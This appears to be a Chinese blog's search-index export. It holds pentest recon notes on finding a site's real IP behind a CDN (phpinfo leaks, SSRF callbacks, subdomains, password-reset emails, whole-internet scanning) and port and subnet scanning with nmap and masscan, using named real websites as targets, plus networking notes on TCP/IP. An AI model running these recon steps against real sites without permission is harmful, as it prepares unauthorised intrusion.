<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息打点-几种常见的CDN绕过方式</title>
      <link href="/post/8fc46e55.html"/>
      <url>/post/8fc46e55.html</url>
      
        <content type="html"><![CDATA[<h2 id="CDN前置知识"><a href="#CDN前置知识" class="headerlink" title="CDN前置知识"></a>CDN前置知识</h2><h3 id="工作原理及阻碍"><a href="#工作原理及阻碍" class="headerlink" title="工作原理及阻碍"></a>工作原理及阻碍</h3><p>CDN：Content Delivery Network，内容分发网络，其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输得更快、更稳定，通俗来说，就是在自己主机和服务器之间找一个就近点，这个就近点存储着服务器的访问资源，相当于缓存，在访问服务器时会定向到临近主机，以加快访问速度</p><p>CDN阻碍：在进行渗透测试的时候可能测试的是一个CDN节点服务器，无法获取真实服务器的数据</p><h3 id="CDN配置"><a href="#CDN配置" class="headerlink" title="CDN配置"></a>CDN配置</h3><p>加速域名：当某IP地址下的某个域名被加速，那么当用户访问该域名时，它就是被加速访问的，对于其他子域名，就不是加速访问的</p><p>业务类型：服务器中被加速的资源。分为页面加速、大文件下载加速，视频点播加速和全站加速；当选择特定的加速服务时，我们可以通过访问其他未被加速的资源，来找到真实的IP地址</p><p>加速区域：指定区域进行加速，加速效果只在区域内有效，阿里云有中国境内加速，全球加速，全球加速（除中国境内）三种加速区域</p><h3 id="CDN类型"><a href="#CDN类型" class="headerlink" title="CDN类型"></a>CDN类型</h3><p>1.传统访问：用户访问域名—-&gt;解析服务器IP—-&gt;访问目标主机</p><p>2.普通CDN：用户访问域名—-&gt;CDN节点—-&gt;真实服务器IP—-&gt;访问目标主机</p><p>3.带WAF的CDN：用户访问域名—-&gt;CDN结点（WAF）—-&gt;真实服务器IP—-&gt;访问目标主机</p><h2 id="CDN绕过方式"><a href="#CDN绕过方式" class="headerlink" title="CDN绕过方式"></a>CDN绕过方式</h2><h3 id="phpinfo泄露"><a href="#phpinfo泄露" class="headerlink" title="phpinfo泄露"></a>phpinfo泄露</h3><p><strong>在域名后面直接加<code>/phpinfo.php</code></strong>，如果存在该php文件，它会显示服务器的一些配置信息，包括IP地址。需要注意的是，<code>phpinfo.php</code>中的IP地址是主机本地的IP地址，也就是说可能是内网IP，也可能是外网IP，也不排除目标主机有多个网卡</p><h3 id="利用漏洞绕过CDN-例如SSRF漏洞"><a href="#利用漏洞绕过CDN-例如SSRF漏洞" class="headerlink" title="利用漏洞绕过CDN(例如SSRF漏洞)"></a>利用漏洞绕过CDN(例如SSRF漏洞)</h3><p>该方法利用网站的SSRF漏洞，利用服务器的漏洞去访问我们设置好的资源，让服务器对我们进行一个主动连接。以获取真实的IP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SSRF漏洞简介</span><br><span class="line">ssrf（服务器端请求伪造）是一种由攻击者构造形成，由服务端发起请求的安全漏洞，攻击目标通常是从外网无妨访问到内部系统的服务器。正是因为是由服务器发起的，所以它能够请求到与它相连而与外网隔离的内部系统</span><br></pre></td></tr></table></figure><p>相关案例：利用SSRF漏洞获取真实IP</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132013468.png" alt="image-20240514132013468"></p><p>让目标服务器访问我们的网站，并在自己的服务器上进行监听</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132054703.png" alt="image-20240514132054703"></p><p>点击提交后，自己的服务器可以监听到相关请求</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514132159837.png" alt="image-20240514132159837"></p><p>获取的<code>47.75.212.155</code>即为我们想要获得的真实IP</p><h3 id="利用子域名"><a href="#利用子域名" class="headerlink" title="利用子域名"></a>利用子域名</h3><p>某些企业业务线比较多，有些站点的主站甚至部分域名使用了CDN加速，但是一些子域名并未使用加速服务，那么就可以通过子域名去获取目标的真实IP</p><p>以下是相关真实案例：<code>www.sp910.com</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514130209088.png" alt="image-20240514130209088"></p><p>先使用超级ping来查询是否存在CDN</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514130348584.png" alt="image-20240514130348584"></p><p>很显然，是开启了CDN加速服务的，在设置CDN的时候，如果加速域名设置了<code>www.xxx.com</code>，就会只对该域名加速，如果设置的是<code>*.xxx.com</code>，那么所有<code>xxx.com</code>下的子域名都会被加速，对于这个案例，我们可以验证一下<code>sp910.com</code>，看是否对该子域名进行了加速</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514131055382.png" alt="image-20240514131055382"></p><p>我们可以看到，所有的ip地址都一样，所以<code>sp910.com</code>并没有被加速，且<code>203.107.44.133</code>为该网站的真实IP</p><h3 id="接口国外访问"><a href="#接口国外访问" class="headerlink" title="接口国外访问"></a>接口国外访问</h3><p>针对某些网站开了CDN服务，但是只开了中国内地加速，这个时候可以选择通过国外的接口网站进行访问，可以查到真实的IP</p><p>相关案例：<code>www.xuexila.com</code>，依旧进行超级ping，观察是否有CDN</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514133903246.png" alt="image-20240514133903246"></p><p>从结果观察，是存在CDN的，这个时候我们找一个国外结点进行访问（最后找非洲不知名国家，一般的都不会在那里开CDN加速服务）</p><p>国外访问地址：<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业精准的IP库服务商_IPIP</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514135447052.png" alt="image-20240514135447052"></p><p><strong>注意，测试出来的不一定真的为真实IP，还需要综合社工进行判断，所有的方法测出来的都不一定完全正确</strong></p><p><strong>还有一种比较抽象的方法，<a href="https://get-site-ip.com/，这个网站可以直接返回真实IP，但是不保真，可以拿来做验证">https://get-site-ip.com/，这个网站可以直接返回真实IP，但是不保真，可以拿来做验证</a></strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514144322780.png" alt="image-20240514144322780"></p><h3 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h3><p>通过网站的找回密码功能让服务器主动给我们发送相关邮件，我们通过邮件获取真实IP</p><p>相关案例：<code>www.mozhe.cn</code></p><p>通过找回密码，让服务器给我们发送相关邮件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140018068.png" alt="image-20240514140018068"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140358693.png" alt="image-20240514140358693"></p><p>点击显示原文，在原文中获取真实IP</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514140529382.png" alt="image-20240514140529382"></p><h3 id="全网段扫描-FuckCDN"><a href="#全网段扫描-FuckCDN" class="headerlink" title="全网段扫描-FuckCDN"></a>全网段扫描-FuckCDN</h3><p>工具下载：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p><p>我们仍然使用<code>www.xuexila.com</code>进行测试，首先先配置<code>set.ini</code>文件，将<code>FindUrl</code>改成我们需要测试的url，FindStr填写为网页关键字，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514141936631.png" alt="image-20240514141936631"></p><p>在<code>ip.txt</code>文件中配置ip地址的范围，通过百度搜索域名查询和备案信息 查询属于哪个平台，在通过平台查询IP范围（实在不知道可以直接<code>0.0.0.0 255.255.255.255</code>全网的扫描</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142622836.png" alt="image-20240514142622836"></p><p> 打开fuckcdn.exe并在Scan url出写入域名</p><p>通过本机的cmd获取本地访问该域名的ip地址并写入工具中，端口为80</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142752985.png" alt="image-20240514142752985"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142826986.png" alt="image-20240514142826986"></p><p>开始运行工具，如下图所示则表示运行成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514142918230.png" alt="image-20240514142918230"></p><p>最后会生成一个result_ip的txt文件，里面存放着真实的IP地址</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514144605858.png" alt="image-20240514144605858"></p><p>还是好多，说明源主机可能不只一个（好歹是个运行了20年的大站）</p><h2 id="CDN绑定"><a href="#CDN绑定" class="headerlink" title="CDN绑定"></a>CDN绑定</h2><p>最后将获得的真实IP和我们的域名绑定在一起，以方便后面的渗透测试，使得我们进行访问域名的时候，不使用其提供的缓存，而是直接访问主机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hosts地址: C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240514145211552.png" alt="image-20240514145211552"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-端口扫描&amp;WAF扫描&amp;负载均衡&amp;CDN服务</title>
      <link href="/post/8cfaf7f.html"/>
      <url>/post/8cfaf7f.html</url>
      
        <content type="html"><![CDATA[<h2 id="获取网络信息-服务厂商-amp-网络架构"><a href="#获取网络信息-服务厂商-amp-网络架构" class="headerlink" title="获取网络信息-服务厂商&amp;网络架构"></a>获取网络信息-服务厂商&amp;网络架构</h2><p>1.每个厂商的防护策略不同，获取到厂商信息可以第一时间知道目标服务器的防护情况</p><p>2.搞清楚是外网还是内网</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下面是一个简单的例子，说明为什么搞清楚内外网很重要</span><br><span class="line">外网出口IP:<span class="number">196.128</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">内网:<span class="number">125.136</span><span class="number">.7</span><span class="number">.6</span></span><br><span class="line">内外<span class="number">125.136</span><span class="number">.7</span><span class="number">.6</span>可以直接访问外网，在交换机处做端口映射，流量给到<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">外网是探测不到内网的</span><br><span class="line">对于安全测试来说，如果进行端口扫描，只能扫描到外网流量出口，对于部署在内网的网站，会扫不到或者误报</span><br></pre></td></tr></table></figure><p>3.收集同一网段下其他资源信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">比如</span><br><span class="line">目标:<span class="number">171.40</span><span class="number">.78</span><span class="number">.83</span></span><br><span class="line">网段:<span class="number">171.40</span><span class="number">.78</span><span class="number">.1</span>-<span class="number">255</span></span><br><span class="line">可以收集该网段下WEB应用、FTP、SSH、redis等各种服务的信息</span><br><span class="line">如果已经拿到<span class="number">171.40</span><span class="number">.78</span><span class="number">.99</span>的服务器信息，与目标靶机处于同一网段，就可以进行内网攻击安全测试手段</span><br></pre></td></tr></table></figure><h2 id="服务信息获取-协议应用-amp-内网资产"><a href="#服务信息获取-协议应用-amp-内网资产" class="headerlink" title="服务信息获取-协议应用&amp;内网资产"></a>服务信息获取-协议应用&amp;内网资产</h2><h3 id="协议应用（端口扫描）"><a href="#协议应用（端口扫描）" class="headerlink" title="协议应用（端口扫描）"></a>协议应用（端口扫描）</h3><p>渗透测试常见开放端口及利用：<a href="https://www.cnblogs.com/iAmSoScArEd/p/10564262.html">渗透测试常见开放端口及利用 - 我超怕的 - 博客园 (cnblogs.com)</a></p><p>端口扫描工具：Nmap、Masscan</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">nmap www.xiaodi8.com -Pn --osscan-limit -sV  <span class="comment">#扫描端口、服务器等信息</span></span><br><span class="line">masscan -p1-<span class="number">65535</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.155</span>    <span class="comment">#扫描这个地址下的所有端口</span></span><br><span class="line">masscan -p80,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">8888</span>,<span class="number">8080</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.0</span>/<span class="number">24</span>   <span class="comment">#扫描某网段下指定端口</span></span><br></pre></td></tr></table></figure><h3 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h3><p>同服务器下的不同WEB应用查询技术</p><p>例如，同一服务器171.40.78.83下有多个网站，<code>www.123.com、www.456.com、www.999.com</code></p><p>目标<code>www.123.com</code>没有什么安全测试头绪时，用旁注查询到该IP下还有其他域名，对其他域名试试能不能有突破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">旁注查询网站：</span><br><span class="line">https://chapangzhan.com/</span><br><span class="line">https://www.webscan.cc/</span><br><span class="line">http://stool.chinaz.com/same</span><br><span class="line">https://c.webscan.cc/</span><br></pre></td></tr></table></figure><h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><p>同网段下不同服务器IP下的WEB应用查询技术</p><p><code>171.40.78.83</code>下<code>www.123.com</code>或者其他应用都没有安全测试头绪的时候，就可以查询<code>171.40.78.1-255</code>所有网段下所涉及的所有协议服务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C段在线查询：https://c.webscan.cc/</span><br></pre></td></tr></table></figure><p>kali查询c段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>masscan -p80,<span class="number">21</span>,<span class="number">3306</span>,<span class="number">8888</span>,<span class="number">8080</span> <span class="number">47.75</span><span class="number">.212</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"><span class="number">2.</span>IP反查，查询该网站域名</span><br><span class="line">IP反查工具：https://dns.aizhan.com/</span><br><span class="line"><span class="number">3.</span>进行内外渗透</span><br></pre></td></tr></table></figure><h2 id="阻碍信息获取-CDN-amp-WAF-amp-均衡负载-amp-防火墙"><a href="#阻碍信息获取-CDN-amp-WAF-amp-均衡负载-amp-防火墙" class="headerlink" title="阻碍信息获取-CDN&amp;WAF&amp;均衡负载&amp;防火墙"></a>阻碍信息获取-CDN&amp;WAF&amp;均衡负载&amp;防火墙</h2><h3 id="CDN服务识别"><a href="#CDN服务识别" class="headerlink" title="CDN服务识别"></a>CDN服务识别</h3><p>在上一篇文字中介绍过CDN服务为什么会给我们的渗透带来阻碍，这里介绍一些识别方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用超级ping，在全国各地对这个地址进行访问</span><br><span class="line">如果全国各地访问的IP都不同，那么就开启了CDN服务</span><br><span class="line">如果全国各地访问的IP相同，那么未开启CDN服务</span><br></pre></td></tr></table></figure><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h3><p>1.看图识WAF</p><p>常见WAF拦截页面：<a href="https://www.cnblogs.com/charon1937/p/13799467.html">看图识WAF——搜集常见WAF拦截页面 - Charon·1937 - 博客园 (cnblogs.com)</a></p><p>2.脚本识别工具</p><p>利用kali的wafw00f工具识别</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240513134141311.png" alt="image-20240513134141311"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>kali自带识别工具lbd</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240513134734972.png" alt="image-20240513134734972"></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>防火墙与内网渗透的关系比较大，协议的入站/出战规则对端口扫描有限制</p><p><strong>nmap只可以识别默认的防火墙，对于有自装的防火墙识别不了</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -端口扫描 -CDN -WAF -负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/post/e73517db.html"/>
      <url>/post/e73517db.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL（Structured Query Language)，结构化查询语言，例如</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name <span class="keyword">WHERE</span> a<span class="operator">=</span>xxx AND...</span><br><span class="line"><span class="keyword">UPDATE</span> tbl_name <span class="keyword">set</span> col_1 <span class="operator">=</span> <span class="string">&#x27;xx&#x27;</span> <span class="keyword">where</span> ...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl_name ...</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240502215914729.png" alt="image-20240502215914729"></p><p><strong>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</strong></p><p>本质是把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p><h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -CTF -SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-TCP&amp;IP&amp;MAC</title>
      <link href="/post/3ec99e92.html"/>
      <url>/post/3ec99e92.html</url>
      
        <content type="html"><![CDATA[<h2 id="可靠传输——TCP"><a href="#可靠传输——TCP" class="headerlink" title="可靠传输——TCP"></a>可靠传输——TCP</h2><p>HTTP是基于TCP协议传输的，TCP协议是一种可靠的传输，HTTP之所以要用到TCP协议而不使用UDP协议，也很简单，设想一下如果你在上网的时候页面发生缺失，或者图片缺失，很难受对不对，所以要使用可靠传输来保证我们上网的体验感，所以我们先来了解一下TCP协议</p><h3 id="TCP包头格式"><a href="#TCP包头格式" class="headerlink" title="TCP包头格式"></a>TCP包头格式</h3><p>TCP报文首部格式如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430104607823.png" alt="image-20240430104607823"></p><p>首先<strong>源端口号</strong>和<strong>目的端口号</strong>是必不可少的，有了这两个端口号，数据包才知道从哪里来，要到哪里去</p><p>接下来<strong>序号</strong>也是必不可少的，序号是包的序号，这个是为了解决包乱序的问题，给包编上序号，就不会弄混啦😁😁😁</p><p>然后就是<strong>确认号</strong>，目的是为了确认发出去的对方是否有收到，如果没有收到就应该重新发送，直到送达，这个是为了解决丢包问题</p><p>接下来就是一些<strong>状态位</strong>，SYN是发起一个连接，ACK是回复，RST是重新连接，FIN是结束连接等等。因为TCP是面向连接的，因而双方需要维护连接的状态，这些状态位的发送，会引起双方状态的变更</p><p>紧接着就是<strong>窗口大小</strong>，因为TCP承担着<strong>流量控制</strong>的责任，所以在通信的过程中，通信双方各声明一个窗口（缓存大小），标识自己当前能够处理的能力，别发送的太多太快，也别发送的太少太慢；除了流量控制以外，TCP还会做<strong>拥塞控制</strong>，对于传输信道上到底堵不堵，它无能为力，唯一能做的只有控制自己，即控制发送的速度，做到拥塞控制</p><h3 id="TCP的三次握手"><a href="#TCP的三次握手" class="headerlink" title="TCP的三次握手"></a>TCP的三次握手</h3><p>在HTTP传输数据之前，首先要建立TCP连接，TCP连接的建立，通常需要<strong>三次握手</strong>，这个所谓的连接，只是双方计算机里维护的一个状态机，在连接建立的过程中，双方的时序图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430115145454.png" alt="image-20240430115145454"></p><ul><li>一开始，客户端和服务端都处于CLOSED状态，首先是服务器主动监听某个端口，处于LISTEN状态</li><li>然后客户端主动发起连接SYN，之后处于SYN-SENT状态</li><li>服务端收到发起的连接，返回SYN，并且ACK客户端的SYN，之后处于SYN-RCVD状态</li><li>客户端收到服务器发送的SYN和ACK之后，发送对SYN确认的ACK，之后处于ESTABLISHED状态，因为它一发一收成功了，处于就绪状态</li><li>服务端收到ACK的ACK后，处于ESTABLISHED状态，因为它也一发一收成功了</li></ul><mark class="hl-label purple">三次握手的目的是保证双方都有发送和接受的能力</mark> <h3 id="TCP分割数据"><a href="#TCP分割数据" class="headerlink" title="TCP分割数据"></a>TCP分割数据</h3><p>如果HTTP请求消息比较长，超过MSS的长度，这是TCP就需要把HTTP的数据拆解成一块块的数据发送，而不是一次性发送所有的数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430132023369.png" alt="image-20240430132023369"></p><ul><li>MTU：一个网络包的最大长度，以太网一般为1500字节</li><li>MSS：除去IP和TCP头部之后，一个网络包所能容纳的TCP数据的最大长度</li></ul><p>数据会被以MSS的长度为单位进行拆分，拆分出来的每一块数据都会被放入单独的网络包中。也就是在每个被拆分的数据加上TCP头信息，然后交给IP模块来发送数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430143344590.png" alt="image-20240430143344590"></p><h3 id="TCP报文生成"><a href="#TCP报文生成" class="headerlink" title="TCP报文生成"></a>TCP报文生成</h3><p>TCP协议里面会有两个端口，一个是浏览器监听的端口（通常是随机生成的），一个是Web服务器监听的端口（HTTP默认端口号是80，HTTPS默认端口号是443）</p><p>在双方建立连接后，TCP报文中的数据部分就是存放HTTP头部+数据，组装好TCP报文之后，就交给下面的网络层处理</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430144543022.png" alt="image-20240430144543022"></p><p>至此HTTP数据包成功发送出去了，但是该怎么知道该往哪走呢？</p><h2 id="远程定位——IP"><a href="#远程定位——IP" class="headerlink" title="远程定位——IP"></a>远程定位——IP</h2><p>TCP模块在执行连接、收发、断开等各阶段操作时，都需委托IP模块将数据封装成网络包发送给通信对象</p><h3 id="IP包头格式"><a href="#IP包头格式" class="headerlink" title="IP包头格式"></a>IP包头格式</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240430144950991.png" alt="image-20240430144950991"></p><p>首先也是要有<strong>源地址IP</strong>和<strong>目标地址IP</strong>：</p><ul><li><p>源地址IP：客户端输出的IP地址</p></li><li><p>目标地址：通过DNS域名解析得到的Web服务器IP</p></li></ul><p>因为HTTP是通过TCP进行传输的，所以在IP包头的协议号，要填写06（D），表示为TCP协议</p><p>当存在多个网卡时，一台主机就会有多个IP地址，这个时候需要判断到底应该填写哪个地址，即使用哪一个网卡来进行发包</p><p>这个时候就要用到<strong>路由表规则</strong>，来判断哪一个网卡作为源地址IP，路由表规则即拿IP地址和子网掩码进行与（&amp;）运算，得到一个结果，拿去和本机Destination进行比较，匹配不一致，则失败，匹配成功，则使用该网卡的IP地址作为IP包头的源地址，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510084848049.png" alt="image-20240510084848049"></p><p>这是有了IP协议，知道了从哪来，该到哪去，但是要怎么去呢？下一站该去哪呢？</p><h2 id="两点传输——MAC"><a href="#两点传输——MAC" class="headerlink" title="两点传输——MAC"></a>两点传输——MAC</h2><p>生成了IP头部后，接下来网络包还需要在IP头部的前面加上<strong>MAC头部</strong></p><p>MAC头部是以太网使用的头部，它包含了接收方和发送方的MAC地址等信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510085351565.png" alt="image-20240510085351565"></p><p>MAC包里面需要<strong>发送方MAC地址</strong>和<strong>接收方目标MAC地址</strong>，用于两点间的传输</p><p>在TCP/IP通信里，MAC包头的协议类型只使用：</p><ul><li>0800：IP协议</li><li>0806：ARP协议</li></ul><p>发送方的MAC地址获取比较简单，MAC地址是在网卡生产时写入到ROM里的，只要将这个值读取出来写入到MAC头部就可以了</p><p>接收方获取MAC地址有点复杂，首先得先弄清楚要发给谁，这个在前面已经讨论过了，查一下路由表就行了，但是这只知道IP地址，如何获取MAC地址呢？</p><p>此时就要用到ARP协议帮我们找到路由器的MAC地址，ARP协议会在以太网中以广播的形式，对以太网的所有设备喊出：“这个IP地址是谁的？把你的MAC地址告诉我。”</p><p>然后就会有主机进行回应：“这个IP是我的，我的MAC地址是xxxx”。</p><p>如果对方和自己处于一个子网中，那么通过上面的操作就可以得到对方的MAC地址，然后我们将MAC地址写入MAC头部中，MAC头部就完成了</p><p>但是每次都进行这种广播操作，不是很麻烦吗？这个时候，操作系统会把本次查询的查询结果放在一块叫做ARP缓存的内存空间留着以后使用，不过缓存的时间只有几分钟</p><p>至此，网络包的报文如下图</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510092623930.png" alt="image-20240510092623930"></p><p>至此，所有准备工作已经完成，终于要出门了</p><h3 id="出口——网卡"><a href="#出口——网卡" class="headerlink" title="出口——网卡"></a>出口——网卡</h3><p>网络包只是存放在内存中的一串二进制数字信息，没有办法直接发送给对方，因此我们需要将数字信号转化为电信号，才能在网线上传输</p><p>负责执行这一操作的是<strong>网卡</strong>，要控制网卡还得靠<strong>网卡驱动程序</strong></p><p>网卡驱动获取网络包后，会将其复制到网卡内的缓存区中，接着会在其开头加上<strong>报头和起始帧分界符</strong>，在末尾加上<strong>用于检测错误的帧校验序列</strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510093242951.png" alt="image-20240510093242951"></p><ul><li>起始帧分界符是一个用来表示包起始位置的标记</li><li>末尾的FCS用来检测包在传输的过程中是否有损坏</li></ul><p>最后网卡会将数据包转换为电信号，通过网线发送出去</p><h3 id="送别者——交换机"><a href="#送别者——交换机" class="headerlink" title="送别者——交换机"></a>送别者——交换机</h3><p>交换机的设计是将网络包原样转发到目的地，交换机工作在MAC层，也称<strong>二级网络设备</strong></p><p>首先，电信号到达网线接口，交换机里的模块进行接收，接下来交换机里的模块将电信号转换为数字信号</p><p>然后通过包末尾的FCS校验错误，如果没问题就放到缓冲区，这部分操作基本和计算机的网卡相同，但交换机的工作方式和网卡不同。</p><p>将包存入缓冲区后，接下来要查询一下这个包的接收方MAC地址是否已经在MAC地址表中有记录了</p><p>交换机的MAC地址表主要包含两个信息：</p><ul><li>设备的MAC地址</li><li>该设备连接在交换机的哪个端口上</li></ul><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240510094923224.png" alt="image-20240510094923224"></p><p>举个例子，如果收到的包的接收方MAC地址为<code>00-00-C0-16-AE-FD</code>，则根据MAC地址表，知道这个地址位于<code>2</code>号端口上，然后通过交换电路将包发送到相应的端口</p><p>当MAC地址表中找不到指定的MAC地址的时候，可能是因为具有该地址的设备还没有向交换机发送过包，或者有一段时间没工作导致从地址表中删除了</p><p>这时候，交换机无法判断该转发到哪个端口上，只能将数据包转发到除了源端口之外的所有端口</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -计算机网络 -TCP协议 -IP协议 -MAC协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-TCP/IP模型&amp;HTTP</title>
      <link href="/post/7c3ce4f0.html"/>
      <url>/post/7c3ce4f0.html</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-IP网络模型概述"><a href="#TCP-IP网络模型概述" class="headerlink" title="TCP/IP网络模型概述"></a>TCP/IP网络模型概述</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>我们能直接接触到的就是应用层，我们手机和电脑使用的应用软件都是在应用层实现的</p><p>应用层只需要专注于为用户提供应用功能，如HTTP、FTP、Telnet、DNS、SMTP等等</p><p>应⽤层是⼯作在操作系统中的<strong>⽤户态</strong>，传输层及以下则⼯作在<strong>内核态</strong></p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>传输层有两个协议，分别是TCP和UDP</p><p>TCP 的全称叫传输控制协议（Transmission Control Protocol），⼤部分应⽤使⽤的正是 TCP传输层协议，⽐如 HTTP 应⽤层协议。TCP 相⽐  UDP 多了很多特性，⽐如流量控制、超时重传、拥塞控制等，这些都是为了保证数据包能可靠地传输给对⽅</p><p>UDP相对来讲就很简单，只负责发送数据包，不保证数据包是否能抵达对方，但是实时性更好，传输效率也更高。当然UDP也可以实现可靠传输，把TCP的特性在应用层上实现就可以</p><p>应用需要传输的数据可能会非常大，直接全部传输不是很好控制，因此当传输层的数据包大小超过MSS（TCP最大报文段长度），就要将数据包分块，这样即使在传输的过程中发生丢包，也只需要重新传输这一个分块，而不需要重新发送整个数据包，每个分块被称为一个<strong>TCP段</strong></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426093814283.png" alt="image-20240426093814283"></p><p>当设备作为接收⽅时，传输层则要负责把数据包传给应⽤，但是⼀台设备上可能会有很多应⽤在接收或者传输数据，因此需要⽤⼀个编号将应⽤区分开来，这个编号就是<strong>端⼝</strong>，传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用的</p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>传输层并不负责数据从一个设备传输到另一个设备上，实际场景中的⽹络环节是错综复杂的，中间有各种各样的线路和分叉路⼝，如果⼀个设备的数据要传输给另⼀个设备，就需要在各种各样的路径和节点进⾏选择，⽽传输层的设计理念是简单、⾼效、专注，如果传输层还负责这⼀块功能就有点违背设计原则了，也就是说，我们不希望传输层协议处理太多的事情，只需要服务好应用即可，传输层只作为应用间的数据传输媒介，帮助实现应用到应用的通信，实际传输功能交给网络层</p><p>⽹络层最常使⽤的是 IP 